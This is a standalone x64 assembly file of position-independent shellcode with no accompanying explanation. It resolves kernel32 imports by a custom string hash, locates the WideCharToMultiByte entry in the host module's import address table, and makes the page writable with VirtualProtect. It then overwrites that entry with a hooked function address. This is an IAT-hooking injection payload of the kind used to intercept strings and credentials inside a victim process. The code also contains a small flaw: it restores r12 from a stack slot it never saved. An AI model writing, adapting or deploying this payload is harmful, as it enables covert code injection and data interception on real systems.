[bits 64]
    push r15
    sub rsp, 8
    call reloc_base
reloc_base:
    pop r15
    sub r15, 11

jmp main

; arg0: str             rcx
;
; ret: num chars        rax
utils_strlen:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                 ; str

    ; rbp - 8 = output strlen
    ; rbp - 16 = rsi
    sub rsp, 16                         ; allocate local variable space
    
    mov qword [rbp - 8], 0              ; strlen = 0
    mov [rbp - 16], rsi                 ; save rsi

    mov rsi, [rbp + 16]                 ; str

    jmp .while_condition
    .loop:
         inc qword [rbp - 8]            ; ++strlen

        .while_condition:
            lodsb                       ; load from mem to al

            cmp al, 0                   ; end of string ?
            jne .loop
    
    mov rsi, [rbp - 16]                 ; restore rsi 
    mov rax, [rbp - 8]                  ; strlen in rax

    leave
    ret

; arg0: &str                rcx
;
; ret: folded hash value    rax
utils_str_hash:
        push rbp 
        mov rbp, rsp

        mov [rbp + 16], rcx     ; &str

        ; rbp - 8 = return value (hash)
        ; rbp - 16 = rbx

        ; r10 = i
        ; r11 = strlen
        ; r8 = tmp word value from str
        ; rbx = &str
        ; rcx = offset from rbx
        ; rax = currentfold

        sub rsp, 16             ; local variable space
        sub rsp, 32             ; shadow space

        mov qword [rbp - 8], 0  ; hash
        mov [rbp - 16], rbx     ; store rbx

        mov rbx, [rbp + 16]     ; &str
        xor r10d, r10d          ; i

        mov rcx, [rbp + 16]     ; &str
        call utils_strlen

        mov r11, rax

    .loop:
        xor rax, rax            ; currentFold
        mov al, [rbx + r10]     ; str[i] in ax, currentfold
        shl rax, 8              ; <<= 8

    .i_plus_1: 
        mov rcx, r10            ; i
        add rcx, 1              ; i + 1

        cmp rcx, r11            ; i + 1 < strlen
        jge .i_plus_2

        movzx r8d, byte [rbx + rcx]
        xor rax, r8             ; currentFold |= str[i + 1]
        shl rax, 8              ; <<= 8

    .i_plus_2:
        mov rcx, r10            ; i
        add rcx, 2              ; i + 2

        cmp rcx, r11            ; i + 2 < strlen
        jge .i_plus_3

        movzx r8d, byte [rbx + rcx]
        xor rax, r8             ; currentFold |= str[i + 2]
        shl rax, 8              ; <<= 8

    .i_plus_3:
        mov rcx, r10            ; i
        add rcx, 3              ; i + 3

        cmp rcx, r11            ; i + 3 < strlen
        jge .cmp_end

        movzx r8d, byte [rbx + rcx]
        xor rax, r8             ; currentFold |= str[i + 3]
        
    .cmp_end:
        add [rbp - 8], rax      ; hash += currentFold

        add r10, 4              ; i += 4

        cmp r10, r11            ; i < strlen
        jl .loop

    .shutdown:
        mov rbx, [rbp - 16]     ; restore rbx
        mov rax, [rbp - 8]      ; return value

        leave
        ret

hook:
        push rbp
        mov rbp, rsp

        ; rbp - 8   = return value;
        ; rbp - 16  = current module hnd
        ; rbp - 24  = import descriptor size
        ; rbp - 32  = current image import descriptor
        ; rbp - 40  = r12
        ; rbp - 48  = oldProtect
        sub rsp, 48             ; local variable space
        sub rsp, 32             ; shadow variable space

        mov qword [rbp - 8], 0  ; return value

        ; get current module handle
        xor rcx, rcx
        call [r15 + data]   ; getModuleHandleA

        cmp rax, 0
        je .shutdown

        mov [rbp - 16], rax     ; current module hnd

        ; load dbgHelp
        mov rcx, r15
        add rcx, dbgHelpStr
        call [r15 + data + 8]   ; loadLibraryA

        cmp rax, 0
        je .shutdown

        ; get first imageImportDescriptor
        mov rcx, [rbp - 16]         ; current module hnd
        mov rdx, 1                  ; TRUE
        mov r8, 1                   ; IMAGE_DIRECTORY_ENTRY_IMPORT
        mov r9, rbp
        sub r9, 24                  ; import descriptor size
        mov qword [rsp + 32], 0
        call [r15 + data + 16]    ; ImageDirectoryEntryToDataEx

        cmp rax, 0
        je .shutdown

        mov [rbp - 32], rax         ; current import image descriptor

        xor r12, r12                ; current module count

    .module_loop:
        ; loop through image import descriptors
        mov rax, [rbp - 32]         ; current image import descriptor
        add rax, 12                 ; IMAGE_IMPORT_DESCRIPTOR.Name (RVA)
        mov eax, [rax]

        add rax, [rbp - 16]         ; current module hnd, rax pointing to name string
   
        ; calculate hash of name string
        mov rcx, rax
        call utils_str_hash

        mov rdx, 0xbef5f1ec          ; kernel32 hash
        cmp rax, rdx
        je .module_found

        add qword [rbp - 32], 20    ; add sizeof IMAGE_IMPORT_DESCRIPTOR

        add r12, 20
        cmp r12, [rbp - 24]         ; import descriptor size

        jne .module_loop
        jmp .shutdown

    .module_found:
        mov rax, [rbp - 32]         ; current image import descriptor
        add rax, 16                 ; offset to first thunk
        mov eax, [rax]
        add rax, [rbp - 16]         ; add current module hnd, rax is IMAGE_THUNK_DATA

        mov rcx, [r15 + data + 32]   ; wideCharToMultiByte

    .function_loop:
        cmp [rax], rcx
        je .function_found

        add rax, 8                  ; add size of thunk data next thunk data
        
        cmp qword [rax], 0
        jne .function_loop

        jmp .shutdown

    .function_found:
        mov [r15 + data + 40], rax

        ; change protection to RW
        mov rcx, [r15 + data + 40]   ; func addr page
        mov rdx, 4096
        mov r8, 0x4                 ; PAGE_READWRITE
        mov r9, rbp
        sub r9, 48                  ; oldProtect
        call [r15 + data + 24]      ; VirtualProtect  

        cmp rax, 0
        je .shutdown

        ; copy the hooked mem address to IAT
        mov rax, [r15 + data + 40]   ; func addr page
        mov rcx, [r15 + data + 48]   ; hooked mem
        mov qword [rax], rcx

        ; change protection to oldProtect
        mov rcx, [r15 + data + 40]   ; func addr page
        mov rdx, 4096
        mov r8, [rbp - 48]          ; oldProtect
        mov r9, rbp
        sub r9, 48                  ; oldProtect
        call [r15 + data + 24]      ; VirtualProtect

    .shutdown:
        mov rax, [rbp - 8]          ; return value
        mov r12, [rbp - 40]         ; r12

        leave
        ret

main:
        push rbp
        mov rbp, rsp

        sub rsp, 32
        call hook

    .shutdown:
        leave
        add rsp, 8
        pop r15
        ret

dbgHelpStr: db 'dbgHelp', 0
.len equ $ - dbgHelpStr - 1

align 16
data:
; getModuleHandleA              0
; loadLibraryA                  8
; imageDirectoryEntryToDataEx   16
; virtualProtect                24
; func addr page                40
; hooked func addr              48
; wideCharToMultiByte           32
